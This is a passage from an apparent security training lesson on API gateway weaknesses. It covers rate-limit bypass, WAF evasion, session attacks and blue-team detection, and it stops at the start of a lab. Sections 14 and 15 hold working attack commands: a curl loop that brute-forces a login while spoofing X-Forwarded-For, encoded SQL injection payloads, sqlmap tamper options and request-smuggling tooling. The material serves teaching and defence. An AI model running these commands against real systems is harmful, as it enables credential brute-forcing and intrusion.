    Trusting a wildcard CA. The gateway trusts a public CA (Let's Encrypt, DigiCert) for client authentication. Anyone with a $10 cert becomes a "trusted client."
    No revocation check. A compromised client cert lives until natural expiry.
    No SAN pinning. The gateway accepts any client cert signed by the private CA, regardless of Subject/SAN. Any lateral movement gets you a valid cert.
    Cert forwarded to backend as a header (X-SSL-Client-Cert) with no validation of who set it. Same class as §4.2.

14. Rate Limiting Architecture
14.1 Algorithms
Algorithm	Behavior	Where Used
Token bucket	Bucket of tokens refills at rate R; each request consumes one; empty ⇒ 429. Allows short bursts.	AWS API Gateway, Kong, Envoy
Leaky bucket	Requests queue and drain at constant rate R; overflow ⇒ 429. Smooths bursts.	Apigee, older Zuul
Fixed window	N requests per calendar window (per minute). Boundary abuse: 2N right at rollover.	Simple in-memory limiters
Sliding window (log)	Store every request timestamp; count in last N seconds. Accurate but expensive.	Cloudflare, Wallarm
Sliding window (counter)	Weighted blend of previous and current fixed windows. Cheap approximation.	Redis-based limiters
14.2 Common Key Choices

Rate limiters key by something. The key is the bypass surface:

    IP address: bypass with a botnet, cloud provider IP rotation, or IPv6 /64 rotation.
    X-Forwarded-For: the limiter trusts the header without stripping — spoof it.
    API key or sub claim: force account rotation, cheap for automated abuse.
    Session cookie: clear and re-login per request.

14.3 Header-Injection Bypass
# The limiter reads X-Forwarded-For; the gateway does not strip it:
for i in $(seq 1 10000); do
  curl -s -H "X-Forwarded-For: 10.0.0.$((RANDOM % 254))" \
       https://api.example.com/login \
       -d "user=admin&pw=guess$i"
done
14.4 Second-Header Injection

Some servers concatenate duplicate headers ("a, b"), others take the first, others the last. If the parser at the limiter disagrees with the parser at the origin, injecting a second header lets you bind the limit to one identity while the origin authenticates as another.
curl -H 'X-API-Key: victim' -H 'X-API-Key: attacker' https://api.example.com/orders
14.5 IP Rotation
# Route each request through a fresh proxy:
proxychains -q -f /etc/proxychains/rotating.conf \
  curl -s https://api.example.com/scrape/1

Legitimately used for load testing; the same technique defeats naive IP-based limits.
15. WAF Integration

WAFs sit in front of the gateway and inspect request content against rule sets — typically OWASP ModSecurity Core Rules, vendor-managed rules, and custom deny lists.
15.1 Common WAFs
WAF	Deployment	Fingerprint
Cloudflare	Edge network	Server: cloudflare, CF-Ray:
AWS WAF	ALB / CloudFront / API Gateway	x-amzn-RequestId, blocked responses often blank
Akamai	Edge	Server: AkamaiGHost, reference ids
ModSecurity + CRS	Self-hosted (nginx, Apache, gateway plugin)	403 with body <title>403 Forbidden</title>
Wallarm	Self-hosted or SaaS	nginx-wallarm, wallarm_mode
Imperva	Cloud / on-prem	X-Iinfo, visid_incap_ cookie
15.2 Bypass Techniques

WAFs are pattern matchers; every pattern has an equivalent form they miss.
# Unicode / encoding tricks:
curl "https://api.example.com/search?q=%u0027%20OR%201%3d1--"  # IIS %u
curl "https://api.example.com/search?q=%c0%27"                  # overlong UTF-8

# Comment injection to break signatures:
sqlmap -u 'https://api.example.com/product?id=1' \
       --tamper=space2comment,between,charunicodeencode

# Case variation:
'; SeLeCt/*!50000 1 */-- -

# HTTP request smuggling (CL.TE, TE.CL, TE.TE) — the WAF sees one request,
# the origin sees two.
15.3 Request Smuggling in Practice
# Detect CL.TE with smuggler.py:
git clone https://github.com/defparam/smuggler
python3 smuggler/smuggler.py -u https://api.example.com/ -q

# Then craft the smuggled prefix so the WAF-approved outer request hides
# an inner request that skips the WAF entirely.

Turbo Intruder (Burp extension) and mitmproxy scripts are the standard tools for iterating on smuggling payloads once a candidate is found.
16. Session-Fixation vs Session-Hijacking in a Gateway Environment

A gateway that terminates a session (whether cookie-based, opaque bearer token, or short-lived JWT) exposes the same two classic risks with a twist: many teams believe an OAuth token is not a session and therefore do not apply session-management hygiene.
16.1 Session Fixation

The attacker forces the victim's browser to use a session identifier the attacker knows.

    Force the victim through a link containing an attacker-chosen state value that the client will echo as its session id.
    Set a cookie on a shared parent domain before the victim authenticates.
    Return a static session id from the login endpoint (a common misconfig in gateway-issued sessions).

Mitigation: rotate the session id (and, for OAuth, the refresh token) on every authentication event.
16.2 Session Hijacking

The attacker steals a valid session identifier — cookie, bearer token, refresh token — and replays it.

    XSS steals cookies not marked HttpOnly.
    MITM on a downgraded TLS connection captures bearer tokens.
    Referrer / log / URL leaks (§12) capture tokens in transit.
    Compromised subdomains steal cookies scoped to .example.com.

Mitigation: HttpOnly, Secure, SameSite=Strict cookies; token binding (DPoP, RFC 9449); short TTL with rotation; monitoring for concurrent use of the same token from geographically impossible locations.
17. Detection — What the Blue Team Sees

Every attack in this lesson has a signature that a competent blue team can build a rule around.
17.1 Gateway and Auth Logs

    401 and 403 rate spikes from a single IP or sub.
    Successful auth from a new country / ASN for an existing user.
    Multiple refresh_token reuse events for the same rotating token.
    JWT verification failures with anomalous algorithms (none, mismatched alg).
    kid values not in the current allow-list.
    Direct connections to backend hosts from IPs outside the gateway subnet.

17.2 WAF Anomaly Rules

    Requests with duplicate X-Forwarded-For or Host headers.
    Transfer-Encoding and Content-Length both present.
    Requests whose path normalizes differently pre- and post-decoding (%2f, ..;/).
    OAuth redirect_uri values not in the client's registered list.

17.3 Cloud Audit

    CloudTrail ConsoleLogin from unexpected regions.
    IAM AssumeRole events with unusually long durations.
    API Gateway MethodNotAllowedException bursts.
    WAF SampledRequests matching custom rules trending upward.

Feed the signals into the SIEM as detections; page on the second-order composition (auth failure + WAF block + geo change ⇒ high severity), not on each individually.
18. Hands-On — HS256 Weak Secret to RS256 with JWKS Pinning

This is the practical assessment for the lesson. Everything runs on a single Kali VM.
18.1 Provision
mkdir -p /root/lab-11 && cd /root/lab-11
